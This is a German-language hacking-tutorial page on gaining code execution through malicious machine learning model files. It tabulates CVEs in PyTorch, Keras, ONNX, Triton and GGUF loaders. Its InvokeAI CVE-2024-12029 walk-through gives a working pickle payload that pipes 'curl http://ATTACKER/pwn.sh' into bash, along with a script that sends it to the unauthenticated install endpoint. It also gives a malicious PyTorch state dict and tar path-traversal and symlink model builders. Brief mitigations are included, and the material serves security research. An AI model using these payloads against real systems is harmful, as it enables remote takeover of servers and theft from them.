# Modelle RCE

{{#include ../banners/hacktricks-training.md}}

## Laden von Modellen zu RCE

Machine Learning-Modelle werden normalerweise in verschiedenen Formaten geteilt, wie ONNX, TensorFlow, PyTorch usw. Diese Modelle können auf den Maschinen der Entwickler oder in Produktionssystemen geladen werden, um sie zu verwenden. Normalerweise sollten die Modelle keinen schädlichen Code enthalten, aber es gibt einige Fälle, in denen das Modell verwendet werden kann, um beliebigen Code auf dem System auszuführen, entweder als beabsichtigte Funktion oder aufgrund einer Schwachstelle in der Bibliothek zum Laden des Modells.

Zum Zeitpunkt des Schreibens sind dies einige Beispiele für diese Art von Schwachstellen:

| **Framework / Tool**        | **Schwachstelle (CVE, falls verfügbar)**                                                    | **RCE-Vektor**                                                                                                                           | **Referenzen**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Unsichere Deserialisierung in* `torch.load` **(CVE-2025-32434)**                                                              | Schadhafter Pickle im Modell-Checkpoint führt zu Codeausführung (Umgehung der `weights_only`-Sicherung)                                 | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + schadhafter Modell-Download verursacht Codeausführung; Java-Deserialisierungs-RCE in der Verwaltungs-API                          | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsicheres YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Laden des Modells aus YAML verwendet `yaml.unsafe_load` (Codeausführung) <br> Laden des Modells mit **Lambda**-Schicht führt zu beliebigem Python-Code | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite-Parsing)                                                                                          | Bearbeitetes `.tflite`-Modell löst ganzzahligen Überlauf aus → Heap-Korruption (potenzielles RCE)                                       | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Laden eines Modells über `joblib.load` führt zur Ausführung von Pickle mit dem Payload des Angreifers `__reduce__`                        | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsicheres `np.load`) *umstritten*                                                                          | `numpy.load` erlaubte standardmäßig pickled Objektarrays – schadhafter `.npy/.npz` löst Codeausführung aus                               | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (Verzeichnisdurchquerung) <br> **CVE-2024-5187** (tar-Durchquerung)                                        | Der externe Gewichts-Pfad des ONNX-Modells kann das Verzeichnis verlassen (beliebige Dateien lesen) <br> Schadhafter ONNX-Modell-Tar kann beliebige Dateien überschreiben (führt zu RCE) | |
| ONNX Runtime (Designrisiko) | *(Keine CVE)* ONNX benutzerdefinierte Operationen / Kontrollfluss                                                               | Modell mit benutzerdefinierter Operation erfordert das Laden des nativen Codes des Angreifers; komplexe Modellgraphen missbrauchen Logik, um unbeabsichtigte Berechnungen auszuführen | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (Pfad-Durchquerung)                                                                                       | Verwendung der Modell-Lade-API mit aktiviertem `--model-control` ermöglicht relative Pfad-Durchquerung zum Schreiben von Dateien (z. B. Überschreiben von `.bashrc` für RCE) | |
| **GGML (GGUF-Format)**      | **CVE-2024-25664 … 25668** (mehrere Heap-Überläufe)                                                                          | Fehlformatierte GGUF-Modell-Datei verursacht Heap-Pufferüberläufe im Parser, was die Ausführung beliebigen Codes auf dem Opfersystem ermöglicht | |
| **Keras (ältere Formate)**  | *(Keine neue CVE)* Legacy Keras H5-Modell                                                                                     | Schadhafter HDF5 (`.h5`)-Modell mit Lambda-Schicht-Code wird beim Laden weiterhin ausgeführt (Keras safe_mode deckt altes Format nicht ab – „Downgrade-Angriff“) | |
| **Andere** (allgemein)      | *Designfehler* – Pickle-Serialisierung                                                                                       | Viele ML-Tools (z. B. pickle-basierte Modellformate, Python `pickle.load`) führen beliebigen Code aus, der in Modell-Dateien eingebettet ist, es sei denn, es gibt Abhilfemaßnahmen | |

Darüber hinaus gibt es einige auf Python-Pickle basierende Modelle wie die von [PyTorch](https://github.com/pytorch/pytorch/security), die verwendet werden können, um beliebigen Code auf dem System auszuführen, wenn sie nicht mit `weights_only=True` geladen werden. Daher könnte jedes auf Pickle basierende Modell besonders anfällig für diese Art von Angriffen sein, auch wenn sie nicht in der obigen Tabelle aufgeführt sind.

### 🆕  InvokeAI RCE über `torch.load` (CVE-2024-12029)

`InvokeAI` ist eine beliebte Open-Source-Webschnittstelle für Stable-Diffusion. Die Versionen **5.3.1 – 5.4.2** exponieren den REST-Endpunkt `/api/v2/models/install`, der es Benutzern ermöglicht, Modelle von beliebigen URLs herunterzuladen und zu laden.

Intern ruft der Endpunkt schließlich auf:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wenn die bereitgestellte Datei ein **PyTorch-Checkpoint (`*.ckpt`)** ist, führt `torch.load` eine **Pickle-Deserialisierung** durch. Da der Inhalt direkt von der benutzerkontrollierten URL stammt, kann ein Angreifer ein bösartiges Objekt mit einer benutzerdefinierten `__reduce__`-Methode im Checkpoint einbetten; die Methode wird **während der Deserialisierung** ausgeführt, was zu **Remote Code Execution (RCE)** auf dem InvokeAI-Server führt.

Die Schwachstelle wurde mit **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %) bewertet.

#### Exploitation walk-through

1. Erstellen Sie einen bösartigen Checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hoste `payload.ckpt` auf einem HTTP-Server, den du kontrollierst (z.B. `http://ATTACKER/payload.ckpt`).
3. Trigger den verwundbaren Endpunkt (keine Authentifizierung erforderlich):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wenn InvokeAI die Datei herunterlädt, wird `torch.load()` aufgerufen → das `os.system` Gadget wird ausgeführt und der Angreifer erhält Codeausführung im Kontext des InvokeAI-Prozesses.

Fertiger Exploit: **Metasploit** Modul `exploit/linux/http/invokeai_rce_cve_2024_12029` automatisiert den gesamten Ablauf.

#### Bedingungen

•  InvokeAI 5.3.1-5.4.2 (Scan-Flag standardmäßig **false**)
•  `/api/v2/models/install` für den Angreifer erreichbar
•  Der Prozess hat Berechtigungen zur Ausführung von Shell-Befehlen

#### Minderung

* Upgrade auf **InvokeAI ≥ 5.4.3** – der Patch setzt `scan=True` standardmäßig und führt eine Malware-Überprüfung vor der Deserialisierung durch.
* Verwenden Sie beim programmgesteuerten Laden von Checkpoints `torch.load(file, weights_only=True)` oder den neuen [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) Helfer.
* Erzwingen Sie Erlauben-Listen / Signaturen für Modellquellen und führen Sie den Dienst mit minimalen Rechten aus.

> ⚠️ Denken Sie daran, dass **jede** Python-Pickle-basierte Format (einschließlich vieler `.pt`, `.pkl`, `.ckpt`, `.pth` Dateien) von untrusted Quellen grundsätzlich unsicher zu deserialisieren ist.

---

Beispiel für eine ad-hoc Minderung, wenn Sie ältere InvokeAI-Versionen hinter einem Reverse-Proxy betreiben müssen:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## Beispiel – Erstellen eines bösartigen PyTorch-Modells

- Erstellen Sie das Modell:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Lade das Modell:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modelle zu Pfad Traversierung

Wie in [**diesem Blogbeitrag**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) kommentiert, basieren die meisten Modellformate, die von verschiedenen KI-Frameworks verwendet werden, auf Archiven, normalerweise `.zip`. Daher könnte es möglich sein, diese Formate auszunutzen, um Pfad Traversierungsangriffe durchzuführen, die es ermöglichen, beliebige Dateien vom System zu lesen, auf dem das Modell geladen wird.

Zum Beispiel können Sie mit dem folgenden Code ein Modell erstellen, das eine Datei im Verzeichnis `/tmp` erstellt, wenn es geladen wird:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Oder, mit dem folgenden Code können Sie ein Modell erstellen, das beim Laden einen Symlink zum Verzeichnis `/tmp` erstellt:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
## Referenzen

- [OffSec-Blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI Patch Commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit-Modul-Dokumentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – Sicherheitsüberlegungen für torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
